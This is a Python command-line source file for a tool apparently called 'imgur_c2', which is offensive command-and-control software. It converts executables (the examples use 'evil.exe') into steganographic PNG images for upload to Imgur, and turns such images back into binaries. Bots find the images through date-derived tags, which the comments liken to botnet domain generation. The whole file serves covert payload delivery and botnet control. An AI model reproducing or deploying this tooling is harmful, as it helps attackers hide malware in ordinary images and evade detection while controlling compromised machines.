"""
    ██╗███╗   ███╗ ██████╗ ██╗   ██╗██████╗ 
    ██║████╗ ████║██╔════╝ ██║   ██║██╔══██╗
    ██║██╔████╔██║██║  ███╗██║   ██║██████╔╝
    ██║██║╚██╔╝██║██║   ██║██║   ██║██╔══██╗
    ██║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║  ██║
    ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                ██████╗██████╗
                ██╔════╝╚════██╗
                ██║      █████╔╝
                ██║     ██╔═══╝
                ╚██████╗███████╗
                ╚═════╝╚══════╝

   
Examples:
    Step 1) Convert a binary to an image:
        $ python3 cli.py -b evil.exe -o not_evil.png
    Step 2) Upload image under this generated tag. (You will do this manually.) 
    Run to find valid tag:
        $ python3 cli.py -t
    Step 3) Though bot watches tag for new uploads. 
            You can test an image by converting an image back to a binary:
        $ python3 cli.py -i not_evil.png -o evil.exe

"""

from imgur_c2.tng import generate_tag_name
from imgur_c2.ImgMsg import ImgMsg, imgMsgFromFile, imgMsgFromImage
import argparse
import sys
from datetime import datetime

# Bots find C2 by searching Imgur for special tags, generated based on
# current utc time. This is similar to domain name generation botnets use.
TODAYS_TAG = generate_tag_name(datetime.utcnow())


def make_parser():
    add_tng_to_banner = "\nCurrent tag is #" + TODAYS_TAG + "\n"

    # Make parser object
    p = argparse.ArgumentParser(
        description=__doc__ + add_tng_to_banner,
        prog="cli.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    group = p.add_mutually_exclusive_group(required=True)

    group.add_argument(
        "-t",
        "--tng",
        action="store_true",
        help="""Show current tag.
            Bots find C2 by searching Imgur for special tags, generated based on
            current utc time. This is similar to domain name generation botnets use.""",
    )
    group.add_argument(
        "-b",
        "--binary",
        help="Path to binary that will be converted into stegano'd image. Must pair with -o",
    )
    group.add_argument(
        "-i",
        "--image",
        help="Path to stegno'd image that will be converted back to binary. Must pair with -o",
    )
    p.add_argument(
        "-o",
        "--output",
        help="""Path to output. For when generating an image from binary (-b) or\
                binary from image (-i).""",
    )

    return p


def show_tng():
    print("As of", datetime.utcnow())
    print("Upload with this tag #" + TODAYS_TAG)
    print("Gallery Url:", "https://imgur.com/t/" + TODAYS_TAG)


def binary_convert(binary_file, image_file):
    imgmsg = imgMsgFromFile(binary_file)
    imgmsg.saveImgFile(image_file)


def image_convert(image_file, binary_file):
    imgmsg = imgMsgFromImage(image_file)
    imgmsg.exportMsgToFile(binary_file)


def main():
    try:
        p = make_parser()
        args = p.parse_args()

        if args.tng:
            show_tng()

        elif args.binary:
            # take binary / output image
            if not args.output:
                print("Must specify image output with -o flag.")
            else:
                binary_convert(args.binary, args.output)

        elif args.image:
            # take image / output binary
            if not args.output:
                print("Must specify image output with -o flag.")
            else:
                image_convert(args.image, args.output)

    except:
        p.print_help(sys.stderr)


if __name__ == "__main__":
    main()
